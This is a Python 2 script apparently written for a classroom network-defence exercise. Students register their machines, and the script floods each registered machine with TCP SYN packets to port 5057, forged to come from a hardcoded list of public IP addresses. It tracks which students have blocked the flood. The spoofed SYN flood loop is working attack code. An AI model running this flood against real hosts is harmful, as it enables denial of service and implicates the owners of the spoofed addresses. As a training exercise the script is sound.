""""
Description           : This module is the attacker.
                        It's handling all the attack of the computer,
                        and print nice table to see who done and who don't.
                        THE ATTACK DON'T START IF NOT ALL THE STUDENT REGISTER!
Author                : Ori Levi and Dana Even-Haim
FileName              : attack.py
Date                  : 18.01.2017
Version               : 1.0
"""
import argparse
import threading
# import socket
# import re
# import os
# import sys
# import time

from scapy.all import *
from contextlib import closing

BOOL_TO_STATUS = ('attacked', 'D O N E')


def print_art(file_name):
    with open(file_name) as f:
        for line in f:
            print line


class Status(object):
    def __init__(self, port, number_):
        """
        This class handle all the logistic of the exercise,
        start with printing the progress table, handle registration

        :param port: the port of the server (registration and status updates)
        :type port: int

        :param number_: the number of computer in the attack
        :param number_: int
        """
        self.port = port
        self.number = number_
        self.status_chk = threading.Thread(target=self.status_checker)
        self.status_prn = threading.Timer(0, self.status_printer)
        self.should_stop = False
        self.thread_start = False
        self.socket = socket.socket()
        self.start_time = 0
        # statuses structure:
        # {
        #   ip: {
        #       'name': name,
        #       'done': false
        #   }
        # }
        self.statuses = dict()

    def start(self):
        """ start all the fun """
        self.socket.bind(('0.0.0.0', self.port))
        self.socket.listen(self.number)

        self.__collect_ips()

        self.start_time = time.time()

        self.should_stop = False
        self.status_prn.start()
        self.status_chk.start()
        self.thread_start = True

    def close(self):
        """ shut down the fun. """
        self.socket.close()
        self.should_stop = True
        self.status_prn.cancel()

        if self.thread_start:
            self.status_chk.join()
            self.thread_start = False

    @property
    def ips_to_attack(self):
        """
        :return: the ips to attack
        :rtype: list
        """
        return [k for k, v in self.statuses.iteritems() if not v['done']]

    def __collect_ips(self):
        """
        Register all the students.
        waiting for all of them before start to attack
        """
        ips_ = {}

        while len(ips_) < self.number:
            cs, ca = self.socket.accept()
            data = cs.recv(1024)
            match = re.match('([\w\s]+)-(\d+\.\d+\.\d+\.\d+)', data)
            if match:
                name = match.group(1)
                ip_ = match.group(2)
                ips_[name] = ip_
                cs.send('done')
                cs.close()
                print '{} just sign up from {} [{}/{}]'.format(name, ip_,
                                                               len(ips_),
                                                               self.number)

        self.statuses = {v: dict(name=k, done=False, time=0)
                         for k, v in ips_.iteritems()}
        print '\n'
        # print the art
        with open('evil.txt') as f:
            for line in f:
                print line,
        print ''
        print 'Press any key to start the attack'.center(62, ' ')
        raw_input()

    def status_printer(self):
        """ print the beautiful table and make WOW effect """
        def separate():
            print '|{0}+{1}+{2}+{2}|'.format('-' * 31, '-' * 15, '-' * 14)

        clear_screen()
        print '|{}|{}|{}|{}|'.format('Name'.center(31, ' '),
                                     'IP'.center(15, ' '),
                                     'Status'.center(14, ' '),
                                     'Time'.center(14, ' '))
        separate()
        for ip_, v in self.statuses.iteritems():
            print '| {:<30}|{:<15}|{:<14}|{:<14}|'.format(
                v['name'], ip_,
                BOOL_TO_STATUS[v['done']].title().center(14, ' '),
                '{}s'.format(v['time']).center(14, ' ')
            )
            separate()

        print self.ips_to_attack  # TODO: delete it!

        threading.Timer(2, self.status_printer).start()

    def status_checker(self):
        """
        waiting for status updates from the students computer.
        MUST USE THE check_answer module
        """
        while not self.should_stop:
            cs, ca = self.socket.accept()

            try:
                cs.settimeout(2)
                data = cs.recv(1024)
                if data and data == 'done':
                    cs.send('done')
                    cs.close()                    
                    self.statuses[ca[0]]['done'] = True
                    self.statuses[ca[0]]['time'] = int(time.time() -
                                                       self.start_time)
            except socket.timeout:
                pass


def clear_screen():
    cmd = 'cls' if sys.platform in ('win32', 'cygwin') else 'clear'
    os.system(cmd)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-n', '--number', type=int, required=True,
                        help='number of clients')
    parser.add_argument('-p', '--port', type=int, required=True,
                        help='server port')

    args = parser.parse_args()

    with closing(Status(args.port, args.number)) as status_handler:

        print 'Waiting for connections...'

        status_handler.start()

        ips = ('164.124.33.70', '164.124.33.71', '164.124.33.73',
               '189.109.30.67', '164.124.33.78', '132.212.36.201',
               '38.198.26.10', '76.196.12.188', '164.124.33.100',
               '164.124.33.95', '76.196.13.18', '132.212.36.218',
               '164.124.33.97', '164.124.33.172', '189.109.37.105',
               '189.109.37.88', '189.109.37.188', '132.212.36.112',
               '38.198.26.40', '76.196.6.157', '38.198.26.41',
               '189.109.37.180', '189.109.37.184', '61.141.8.140',
               '132.212.36.219', '38.198.26.9', '76.196.12.250',
               '76.196.12.251', '164.124.33.164', '164.124.33.160',
               '164.124.33.90', '38.198.26.94', '164.124.33.94',
               '132.212.36.146', '38.198.26.30', '76.196.12.237',
               '76.196.13.19', '38.198.26.39', '189.109.37.202',
               '189.109.37.206')

        while True:
            ips_to_attack = status_handler.ips_to_attack
            if len(ips_to_attack) == 0:
                break

            for aip in ips_to_attack:
                ip = IP(dst=aip)
                tcp = TCP(flags='S', dport=5057)

                for x in ips:
                    ip.src = x
                    sendp(ip / tcp, verbose=False)

    with open('victory.txt') as f:
        for line in f:
            print line,
    print ''
    print 'YES THE NETWORK IS PROTECTED!'
    print 'GOOD JOB MY CYBER WARRIORS'
